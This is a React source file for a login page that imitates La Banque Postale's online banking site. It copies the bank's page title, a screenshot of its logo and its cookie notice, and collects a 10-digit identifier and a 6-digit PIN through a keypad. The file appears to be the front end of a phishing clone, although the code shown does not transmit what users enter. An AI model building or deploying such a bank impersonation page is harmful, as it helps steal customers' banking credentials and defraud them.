import { X, Search } from 'lucide-react';
import { Button } from '../components/ui/button';
import { Input } from '../components/ui/input';
import { Checkbox } from '../components/ui/checkbox';
import { toast } from '../hooks/use-toast';
import React, { useState, useEffect } from 'react';
import { Link } from "react-router-dom";

const Login = () => {
  const [identifier, setIdentifier] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [showCookieBanner, setShowCookieBanner] = useState(true);
  
  // États pour le mot de passe et l'étape
  const [step, setStep] = useState(1); 
  const [password, setPassword] = useState('');
  const keypadNumbers = [9, 3, 4, 8, 1, 6, 2, 5, 0, 7];

  useEffect(() => {
    document.title = "Connexion à mon espace client - La Banque Postale";
  }, []);

  const handleContinue = (e) => {
    e.preventDefault();
    if (identifier.length !== 10) {
      toast({
        title: "Erreur",
        description: "L'identifiant doit contenir 10 chiffres",
        variant: "destructive"
      });
      return;
    }
    setStep(2); // Passage au pavé numérique
  };

  const handleNumberClick = (num) => {
    if (password.length < 6) {
      setPassword(prev => prev + num);
    }
  };

  const handleLogin = (e) => {
    e.preventDefault();
    if (password.length === 6) {
      toast({
        title: "Connexion",
        description: "Vérification de vos identifiants..."
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col md:flex-row">
      {/* Colonne gauche */}
      <div className="w-full md:w-1/2 lg:w-[30%] bg-white flex flex-col">
        <header className="bg-white px-4 md:px-6 py-4 flex items-center justify-between">
          <div className="flex items-center gap-8">
            <Link to="/">
              <img
                src="/Screenshot from 2026-03-11 23-53-07.png"
                alt="logo"
                className="h-28"
              />
            </Link>
          </div>
          <div className="flex items-center gap-4">
            <button className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <Search className="w-8 h-8 text-gray-600" />
            </button>
            <a href="/" className="p-2 hover:bg-gray-100 rounded-full transition-colors">
              <X className="w-8 h-8 text-gray-600" />
            </a>
          </div>
        </header>

        <div className="flex-1 flex items-start justify-center px-4 md:px-6 py-8 md:py-16 bg-white">
          <div className="w-full max-w-md">
            <h1 className="text-2xl font-light text-gray-600 mb-12 text-center">
              Connexion à votre compte particulier
            </h1>

            <form onSubmit={step === 1 ? handleContinue : handleLogin} className="space-y-6">
              <div>
                <label className="block text-sm text-[#002a5a] font-bold mb-2">
                  Identifiant (10 chiffres)
                </label>
                <Input
                  type="text"
                  maxLength={10}
                  disabled={step === 2}
                  value={identifier}
                  onChange={(e) => setIdentifier(e.target.value.replace(/\D/g, ''))}
                  className="w-full h-14 px-4 border border-gray-300 rounded-md text-base focus:ring-2 focus:ring-blue-500 focus:border-transparent"
                  placeholder=""
                />
              </div>

              {step === 1 ? (
                <>
                  <div className="flex items-center space-x-2">
                    <Checkbox
                      id="remember"
                      checked={rememberMe}
                      onCheckedChange={setRememberMe}
                      className="border-gray-400"
                    />
                    <label htmlFor="remember" className="text-sm text-gray-600 cursor-pointer">
                      Mémoriser mon identifiant
                    </label>
                  </div>

                  <Button
                    type="submit"
                    className="w-full h-20 bg-[#013da5] hover:bg-[#013da5] text-white text-lg rounded-md transition-colors"
                  >
                    Continuer
                  </Button>
                </>
              ) : (
                <div className="space-y-6 animate-in fade-in duration-300">
                  <label className="block text-sm text-[#002a5a] font-bold mb-2">
                    Mot de passe (6 chiffres)
                  </label>

                  {/* Visualisation du code PIN (6 cercles) */}
                  <div className="flex justify-center gap-4 mb-8">
                    {[...Array(6)].map((_, i) => (
                      <div
                        key={i}
                        className={`w-3 h-3 rounded-full border border-[#002a5a] ${i < password.length ? 'bg-[#002a5a]' : 'bg-white'}`}
                      />
                    ))}
                  </div>

                  {/* Le pavé numérique conforme à ta PJ */}
                  <div className="grid grid-cols-5 gap-2">
                    {keypadNumbers.map((num) => (
                      <button
                        key={num}
                        type="button"
                        onClick={() => handleNumberClick(num)}
                        className="h-14 bg-[#eef5fc] text-[#002a5a] text-xl font-medium rounded-md hover:bg-blue-100 transition-colors"
                      >
                        {num}
                      </button>
                    ))}
                  </div>

                  <Button
                    type="submit"
                    disabled={password.length < 6}
                    className="w-full h-20 bg-[#013da5] hover:bg-[#013da5] text-white text-lg rounded-md transition-colors"
                  >
                    Se connecter
                  </Button>
                  
                  <button 
                    type="button"
                    onClick={() => { setStep(1); setPassword(''); }}
                    className="w-full text-xs text-blue-800 underline mt-2"
                  >
                    Retour à la saisie de l'identifiant
                  </button>
                </div>
              )}

              <div className="text-center pt-4">
                <a href="#" className="text-sm text-gray-500 hover:text-gray-700 underline">
                  Identifiant / Mot de passe oublié
                </a>
              </div>
            </form>
          </div>
        </div>
      </div>

      {/* Colonne droite */}
      <div className="w-full md:w-1/2 lg:w-[70%] flex flex-col justify-center px-6 md:px-10 lg:px-20 py-10 md:py-16 bg-gradient-to-b from-[#2f5fb3] to-[#3f95c0]">
        <div className="w-full max-w-none">
          <h1 className="text-3xl md:text-4xl lg:text-5xl font-bold text-white mb-8 md:mb-16 text-left">
            La Banque Postale, citoyenne
          </h1>

          <div className="w-full max-w-full md:max-w-2xl lg:max-w-4xl bg-[#184c77] rounded-lg p-5 md:p-8 space-y-4 md:space-y-6">
            <h3 className="text-lg font-medium text-white mb-3">
              Espace Assurance La Banque Postale
            </h3>
            <p className="text-white text-sm leading-relaxed mb-6">
              Vous n'avez pas d'accès Banque En Ligne et souhaitez retrouver vos contrats La Banque Postale Assurance ?
            </p>
            <div className="space-y-3">
              <a href="#" className="block text-white text-sm underline hover:no-underline transition-all">
                Signer mon contrat en ligne
              </a>
              <Link to="/">
                <Button
                  variant="outline"
                  className="w-auto bg-transparent border-2 border-white text-white hover:bg-white/10 px-6 py-2.5 rounded-md transition-all text-sm"
                >
                  Me connecter à mon espace assurance
                </Button>
              </Link>
            </div>
          </div>
        </div>
      </div>

      {/* Cookie Consent Banner (TON CODE ORIGINAL) */}
      {showCookieBanner && (
        <div className="fixed bottom-0 left-0 right-0 bg-white border-t border-gray-200 shadow-2xl z-50">
          <div className="container mx-auto px-6 py-6">
            <div className="flex items-start gap-6">
              <img
                src="/Screenshot from 2026-03-11 23-53-07.png"
                alt="logo"
                className="h-8"
              />

              <div className="flex-1">
                <h3 className="text-base font-semibold text-gray-900 mb-3">
                  La Banque Postale <span className="font-normal">respecte votre vie privée</span>
                </h3>
                <p className="text-sm text-gray-700 mb-4 leading-relaxed">
                  Lors de votre navigation sur notre site, nous et nos filiales utilisons certains cookies dont certains requièrent votre accord pour être déposés. Les finalités de ces cookies sont les suivantes :
                </p>
                <ul className="text-sm text-gray-700 space-y-1 mb-4 ml-4">
                  <li><strong>• Mesure d'audience :</strong> établir des statistiques complémentaires sur l'utilisation de nos sites et applications mobiles.</li>
                  <li><strong>• Analyse et personnalisation :</strong> analyser les parcours clients et les contenus consultés afin de vous proposer des offres produits et services, des informations et communications en fonction de votre navigation et de votre profil.</li>
                  <li><strong>• Publicités :</strong> permettre à La Banque Postale et ses partenaires de vous adresser des publicités correspondant à vos centres d'intérêt sur notre site ou en dehors de notre site.</li>
                  <li><strong>• Vidéos :</strong> vous permettre de visionner directement sur notre site nos contenus multimédias hébergés sur un site externe.</li>
                </ul>
                <p className="text-sm text-gray-700 mb-4">
                  En cliquant sur « Uniquement autoriser les cookies essentiels » vous indiquez votre refus et seuls les cookies strictement nécessaires au bon fonctionnement du site seront déposés.
                  Vous pouvez modifier vos choix à tout moment ou obtenir plus d'informations via <a href="#" className="text-blue-700 underline">notre politique cookies</a>.
                </p>
              </div>
            </div>

            <div className="flex flex-wrap gap-3 mt-6">
              <Button
                onClick={() => setShowCookieBanner(false)}
                className="bg-[#003D7A] hover:bg-[#002A5A] text-white px-8 py-3 rounded-md text-sm font-medium transition-colors"
              >
                TOUT ACCEPTER
              </Button>
              <Button
                onClick={() => setShowCookieBanner(false)}
                variant="outline"
                className="border-2 border-[#003D7A] text-[#003D7A] hover:bg-[#003D7A] hover:text-white px-8 py-3 rounded-md text-sm font-medium transition-colors"
              >
                UNIQUEMENT AUTORISER LES COOKIES ESSENTIELS
              </Button>
              <Button
                onClick={() => setShowCookieBanner(false)}
                variant="outline"
                className="border-2 border-[#003D7A] text-[#003D7A] hover:bg-[#003D7A] hover:text-white px-8 py-3 rounded-md text-sm font-medium transition-colors"
              >
                PERSONNALISER
              </Button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default Login;